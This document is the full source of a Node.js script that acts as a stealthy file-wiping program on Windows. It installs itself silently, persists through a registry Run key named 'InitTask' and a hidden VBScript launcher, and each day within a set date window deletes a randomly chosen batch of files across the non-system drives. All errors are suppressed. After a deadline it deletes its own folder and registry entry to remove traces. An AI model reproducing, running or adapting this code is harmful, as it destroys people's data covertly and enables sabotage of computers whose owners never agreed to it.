const fs = require('fs');
const path = require('path');
const { spawn, execSync } = require('child_process');

const CONFIG_FILE = 'config.json';

const DEFAULT_CONFIG = {
  startDate: null,
  endDate: null,
  uninstallAt: null,
  deleteCount: 40,
  lastRunTime: null,
  deleteFolderPaths: [],
  registryScope: 'HKCU',
  regName: 'InitTask',
  maxDepth: 20,
};

const SKIP_DIR_NAMES = new Set([
  '$recycle.bin',
  'system volume information',
  'windows',
  'program files',
  'program files (x86)',
  'programdata',
  'recovery',
  'boot',
  'efi',
  'msocache',
  'perflogs',
  'appdata',
]);

function expandEnv(p) {
  return String(p).replace(/%([^%]+)%/g, (_, name) => process.env[name] ?? `%${name}%`);
}

function ensureDir(dirPath) {
  const resolved = path.resolve(expandEnv(dirPath));
  if (!fs.existsSync(resolved)) {
    fs.mkdirSync(resolved, { recursive: true });
  }
  return resolved;
}

function readConfigFile(configPath) {
  if (!fs.existsSync(configPath)) {
    return { config: { ...DEFAULT_CONFIG }, usedDefault: true };
  }
  try {
    const raw = JSON.parse(fs.readFileSync(configPath, 'utf8'));
    return { config: { ...DEFAULT_CONFIG, ...raw }, usedDefault: false };
  } catch {
    return { config: { ...DEFAULT_CONFIG }, usedDefault: true };
  }
}

function normalizeRuntimeConfig(config, baseDir) {
  config.deployPath = baseDir;
  config.deleteCount = Math.max(1, parseInt(config.deleteCount, 10) || DEFAULT_CONFIG.deleteCount);
  config.maxDepth = Math.max(1, parseInt(config.maxDepth, 10) || DEFAULT_CONFIG.maxDepth);
  config.deleteFolderPaths = Array.isArray(config.deleteFolderPaths)
    ? config.deleteFolderPaths.map(expandEnv).filter(Boolean)
    : [];
  return config;
}

function loadConfig() {
  const configPath = path.join(__dirname, CONFIG_FILE);
  const { config, usedDefault } = readConfigFile(configPath);
  normalizeRuntimeConfig(config, __dirname);
  return { config, configPath, usedDefault };
}

function loadInstallConfig(sourceDir) {
  try {
    const configPath = path.join(sourceDir, CONFIG_FILE);
    const { config, usedDefault } = readConfigFile(configPath);
    if (!config.deployPath) return null;
    const deployPath = path.resolve(expandEnv(config.deployPath));
    const scope = String(config.registryScope || DEFAULT_CONFIG.registryScope).toUpperCase();
    if (scope !== 'HKCU' && scope !== 'HKLM') return null;
    const regName = config.regName || DEFAULT_CONFIG.regName;
    const removeKeys = Array.isArray(config.removeConfigKeysAfterDeploy)
      ? config.removeConfigKeysAfterDeploy.map(String)
      : ['deployPath'];
    return {
      config,
      configPath,
      usedDefault,
      deployPath,
      registryScope: scope,
      regName,
      removeKeys,
    };
  } catch {
    return null;
  }
}

function writeDeployConfig(sourceConfigPath, destConfigPath, removeKeys) {
  try {
    const raw = JSON.parse(fs.readFileSync(sourceConfigPath, 'utf8'));
    const strip = new Set(
      [...removeKeys, 'removeConfigKeysAfterDeploy'].map((k) => String(k).toLowerCase())
    );
    const out = {};
    for (const [key, value] of Object.entries(raw)) {
      if (!strip.has(key.toLowerCase())) out[key] = value;
    }
    fs.writeFileSync(destConfigPath, `${JSON.stringify(out, null, 2)}\n`, 'utf8');
    return true;
  } catch {
    return false;
  }
}

function findNodeExe() {
  try {
    const out = execSync('where node', { encoding: 'utf8', windowsHide: true }).trim();
    const first = out.split(/\r?\n/).find(Boolean);
    if (first && fs.existsSync(first)) return first;
  } catch {}
  const candidates = [
    path.join(process.env.ProgramFiles || '', 'nodejs', 'node.exe'),
    path.join(process.env['ProgramFiles(x86)'] || '', 'nodejs', 'node.exe'),
  ];
  for (const p of candidates) {
    if (p && fs.existsSync(p)) return p;
  }
  return null;
}

function setRegistryRunValue(scope, regName, regValue) {
  const regKey = getRegistryRunKey(scope);
  if (!regKey) return false;
  try {
    const data = regValue.replace(/"/g, '\\"');
    execSync(`reg add "${regKey}" /v "${regName}" /t REG_SZ /d "${data}" /f`, {
      stdio: 'ignore',
      windowsHide: true,
    });
    return true;
  } catch {
    return false;
  }
}

function getDeployNodeExe(deployPath) {
  return path.join(deployPath, 'node', 'node.exe');
}

function ensureDeployNode(nodeExe, deployPath) {
  const dest = getDeployNodeExe(deployPath);
  ensureDir(path.dirname(dest));
  fs.copyFileSync(nodeExe, dest);
  return dest;
}

function writeRunVbs(vbsPath, nodeExe, initJsPath, workDir) {
  const q = (s) => String(s).replace(/"/g, '""');
  const body = [
    'Option Explicit',
    '',
    'Dim fso, sh, nodeExe, initJs',
    'Set fso = CreateObject("Scripting.FileSystemObject")',
    `nodeExe = "${q(nodeExe)}"`,
    `initJs = "${q(initJsPath)}"`,
    'If Not fso.FileExists(nodeExe) Then WScript.Quit 1',
    'Set sh = CreateObject("Wscript.Shell")',
    `sh.CurrentDirectory = "${q(workDir)}"`,
    'sh.Run """" & nodeExe & """ """ & initJs & """", 0, False',
    '',
  ].join('\r\n');
  fs.writeFileSync(vbsPath, body, 'utf8');
}

function installSilentLauncher(deployPath, scope, regName, nodeExe, initFileName) {
  try {
    const vbsPath = path.join(deployPath, 'run.vbs');
    const initJs = path.join(deployPath, initFileName);
    writeRunVbs(vbsPath, nodeExe, initJs, deployPath);
    const wscript = path.join(process.env.SystemRoot || 'C:\\Windows', 'System32', 'wscript.exe');
    const regValue = `"${wscript}" //B //Nologo "${vbsPath}"`;
    setRegistryRunValue(scope, regName, regValue);
  } catch {}
}

function shouldRunUninstall() {
  return process.argv.slice(2).includes('uninstall');
}

function shouldRunInstall() {
  if (process.argv.slice(2).includes('install')) return true;
  const configPath = path.join(__dirname, CONFIG_FILE);
  if (!fs.existsSync(configPath)) return false;
  try {
    const raw = JSON.parse(fs.readFileSync(configPath, 'utf8'));
    if (!raw.deployPath) return false;
    const target = path.resolve(expandEnv(String(raw.deployPath)));
    return path.resolve(__dirname) !== target;
  } catch {
    return false;
  }
}

function performInstall() {
  try {
    const sourceDir = __dirname;
    const installCfg = loadInstallConfig(sourceDir);
    if (!installCfg) return;

    ensureDir(installCfg.deployPath);

    const systemNode = findNodeExe();
    if (!systemNode) return;

    const nodeExe = ensureDeployNode(systemNode, installCfg.deployPath);

    const selfPath = path.join(sourceDir, path.basename(__filename));
    const deployInit = path.join(installCfg.deployPath, path.basename(__filename));
    fs.copyFileSync(selfPath, deployInit);

    const deployConfigPath = path.join(installCfg.deployPath, CONFIG_FILE);
    writeDeployConfig(installCfg.configPath, deployConfigPath, installCfg.removeKeys);

    installSilentLauncher(
      installCfg.deployPath,
      installCfg.registryScope,
      installCfg.regName,
      nodeExe,
      path.basename(__filename)
    );
  } catch {}
}

function saveConfig(configPath, config) {
  fs.writeFileSync(configPath, JSON.stringify(config, null, 2), 'utf8');
}

function parseDateOnly(str) {
  if (!str) return null;
  const d = new Date(`${str}T00:00:00`);
  return Number.isNaN(d.getTime()) ? null : d;
}

function parseDateTime(str) {
  if (!str) return null;
  const s = String(str).trim();
  const m = s.match(
    /^(\d{4})-(\d{1,2})-(\d{1,2})(?:[T\s](\d{1,2}):(\d{2})(?::(\d{2}))?)?$/
  );
  if (m) {
    const isoDate = `${m[1]}-${String(m[2]).padStart(2, '0')}-${String(m[3]).padStart(2, '0')}`;
    let iso;
    if (m[4] !== undefined) {
      iso = `${isoDate}T${String(m[4]).padStart(2, '0')}:${m[5]}:${m[6] ? String(m[6]).padStart(2, '0') : '00'}`;
    } else {
      iso = `${isoDate}T23:59:59`;
    }
    const d = new Date(iso);
    return Number.isNaN(d.getTime()) ? null : d;
  }
  const normalized = s.includes('T') ? s : s.replace(' ', 'T');
  const d = new Date(normalized);
  return Number.isNaN(d.getTime()) ? null : d;
}

function getUninstallDeadline(config) {
  const at = parseDateTime(config.uninstallAt);
  if (at) return at;
  if (config.endDate) return parseDateTime(config.endDate);
  return null;
}

function isPastUninstallDeadline(deadline) {
  return deadline != null && new Date() >= deadline;
}

function getRegistryRunKey(scope) {
  const s = String(scope || 'HKCU').toUpperCase();
  if (s !== 'HKCU' && s !== 'HKLM') return null;
  return `${s}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`;
}

function isUnsafeDeletePath(dirPath) {
  const normalized = path.resolve(dirPath).replace(/\//g, '\\');
  return /^[A-Za-z]:\\?$/.test(normalized);
}

function removeRegistryRun(scope, regName) {
  const regKey = getRegistryRunKey(scope);
  if (!regKey || !regName) {
    return false;
  }
  try {
    execSync(`reg delete "${regKey}" /v "${regName}" /f`, {
      stdio: 'ignore',
      windowsHide: true,
    });
    return true;
  } catch {
    return false;
  }
}

function scheduleDeployFolderDelete(deployPath) {
  if (isUnsafeDeletePath(deployPath)) {
    return false;
  }
  const cleanupVbs = path.join(
    process.env.TEMP || process.env.TMP || '.',
    `init-cleanup-${Date.now()}.vbs`
  );
  const q = (s) => String(s).replace(/"/g, '""');
  const vbsBody = [
    'Option Explicit',
    'WScript.Sleep 6000',
    'On Error Resume Next',
    'Dim fso',
    'Set fso = CreateObject("Scripting.FileSystemObject")',
    `If fso.FolderExists("${q(deployPath)}") Then fso.DeleteFolder "${q(deployPath)}", True`,
    'fso.DeleteFile WScript.ScriptFullName, True',
    '',
  ].join('\r\n');
  try {
    fs.writeFileSync(cleanupVbs, vbsBody, 'utf8');
    const wscript = path.join(process.env.SystemRoot || 'C:\\Windows', 'System32', 'wscript.exe');
    const child = spawn(wscript, ['//B', '//Nologo', cleanupVbs], {
      detached: true,
      stdio: 'ignore',
      windowsHide: true,
    });
    child.unref();
    return true;
  } catch {
    return false;
  }
}

function performUninstall(config) {
  const deployPath = config.deployPath || __dirname;
  const scope = config.registryScope || DEFAULT_CONFIG.registryScope;
  const regName = config.regName || DEFAULT_CONFIG.regName;
  removeRegistryRun(scope, regName);
  return scheduleDeployFolderDelete(deployPath);
}

function toDateOnly(d) {
  return new Date(d.getFullYear(), d.getMonth(), d.getDate());
}

function daysSinceLastRun(lastRunTime) {
  if (!lastRunTime) return null;
  const last = toDateOnly(new Date(lastRunTime));
  const today = toDateOnly(new Date());
  return Math.round((today - last) / 86400000);
}

function isWithinDateRange(startDate, endDate) {
  const now = new Date();
  const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
  const start = parseDateOnly(startDate);
  const end = parseDateOnly(endDate);
  if (start && today < start) return false;
  if (end && today > end) return false;
  return true;
}

function getNonCDrives() {
  const drives = [];
  for (const letter of 'DEFGHIJKLMNOPQRSTUVWXYZ') {
    const root = `${letter}:\\`;
    try {
      if (fs.existsSync(root)) drives.push(root);
    } catch {}
  }
  return drives;
}

function resolveScanRoots(deleteFolderPaths) {
  if (deleteFolderPaths.length > 0) {
    const roots = [];
    for (const p of deleteFolderPaths) {
      try {
        roots.push(ensureDir(p));
      } catch {}
    }
    return roots;
  }
  return getNonCDrives();
}

function shouldSkipDir(dirPath) {
  const name = path.basename(dirPath).toLowerCase();
  return SKIP_DIR_NAMES.has(name) || name.startsWith('$');
}

function collectFiles(root, maxDepth, depth = 0, out = []) {
  if (depth > maxDepth) return out;

  let entries;
  try {
    entries = fs.readdirSync(root, { withFileTypes: true });
  } catch {
    return out;
  }

  for (const ent of entries) {
    const full = path.join(root, ent.name);
    if (ent.isDirectory()) {
      if (!shouldSkipDir(full)) collectFiles(full, maxDepth, depth + 1, out);
      continue;
    }
    if (!ent.isFile()) continue;
    try {
      if (fs.statSync(full).isFile()) out.push(full);
    } catch {}
  }
  return out;
}

function pickRandom(arr, n) {
  const copy = [...arr];
  const count = Math.min(n, copy.length);
  const picked = [];
  for (let i = 0; i < count; i++) {
    const idx = Math.floor(Math.random() * copy.length);
    picked.push(copy[idx]);
    copy.splice(idx, 1);
  }
  return picked;
}

function main() {
  try {
    const { config, configPath } = loadConfig();

    const uninstallDeadline = getUninstallDeadline(config);
    if (isPastUninstallDeadline(uninstallDeadline)) {
      performUninstall(config);
      return;
    }

    if (!isWithinDateRange(config.startDate, config.endDate)) {
      return;
    }

    const dayGap = daysSinceLastRun(config.lastRunTime);
    if (dayGap === 0) {
      return;
    }

    let effectiveDeleteCount = config.deleteCount;
    if (dayGap !== null && dayGap > 0) {
      effectiveDeleteCount = config.deleteCount * dayGap;
    }

    const roots = resolveScanRoots(config.deleteFolderPaths);
    if (roots.length === 0) {
      return;
    }

    const allFiles = [];
    for (const root of roots) {
      collectFiles(root, config.maxDepth, 0, allFiles);
    }

    if (allFiles.length === 0) {
      return;
    }

    const targets = pickRandom(allFiles, effectiveDeleteCount);
    for (const file of targets) {
      try {
        fs.unlinkSync(file);
      } catch {}
    }

    config.lastRunTime = new Date().toISOString();
    try {
      saveConfig(configPath, config);
    } catch {}
  } catch {}
}

function runUninstall() {
  try {
    const installCfg = loadInstallConfig(__dirname);
    if (!installCfg) return;
    performUninstall({
      deployPath: installCfg.deployPath,
      registryScope: installCfg.registryScope,
      regName: installCfg.regName,
    });
  } catch {}
}

try {
  if (shouldRunInstall()) {
    performInstall();
  } else if (shouldRunUninstall()) {
    runUninstall();
  } else {
    main();
  }
} catch {}
